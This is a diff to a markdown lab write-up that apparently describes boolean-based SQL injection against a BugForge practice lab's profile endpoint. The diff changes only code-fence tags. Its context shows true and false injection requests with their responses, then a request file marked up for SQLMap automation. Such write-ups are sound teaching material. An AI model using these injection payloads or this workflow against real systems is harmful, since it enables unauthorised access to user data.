@@ -10,7 +10,7 @@ While exploring the application and testing different endpoints for SQL Injectio
 When sending a payload that evaluates to true. We observe that a 200 response is returned along with the profile information of user 1:
 
 #### True Request:
-```http
+```sh
 GET /api/profile/'%20or%20'7'%3d'7 HTTP/2
 Host: aaf9b73b68ef.labs.bugforge.io
 Sec-Ch-Ua-Platform: "Linux"
@@ -29,7 +29,7 @@ Priority: u=1, i
 ```
 
 #### True Response:
-```http
+```sh
 HTTP/2 200 OK
 Access-Control-Allow-Origin: *
 Content-Type: application/json; charset=utf-8
@@ -43,7 +43,7 @@ Content-Length: 468
 
 If we send a payload that evaluates to false like:
 #### False Request
-```http
+```sh
 GET /api/profile/'%20or%20'7'%3d'8 HTTP/2
 Host: aaf9b73b68ef.labs.bugforge.io
 Sec-Ch-Ua-Platform: "Linux"
@@ -64,7 +64,7 @@ Priority: u=1, i
 We observe no user information is returned:
 
 #### False Response
-```http
+```sh
 HTTP/2 404 Not Found
 Access-Control-Allow-Origin: *
 Content-Type: application/json; charset=utf-8
@@ -79,7 +79,7 @@ Content-Length: 26
 We could start to test for Union based injection now, but for todays blog I'm going to demonstrate SQLMap. Let's copy a request to the profile endpoint and see if we can get SQLMap to do our dirty work for us. Since we are not testing an obvious parameter we will add a `*` where we want SQLMap to test. We will save the file as `sql.req`:
 
 #### Request formatted for SQLMap
-```http
+```sh
 GET /api/profile/test* HTTP/2
 Host: aaf9b73b68ef.labs.bugforge.io
 Sec-Ch-Ua-Platform: "Linux"
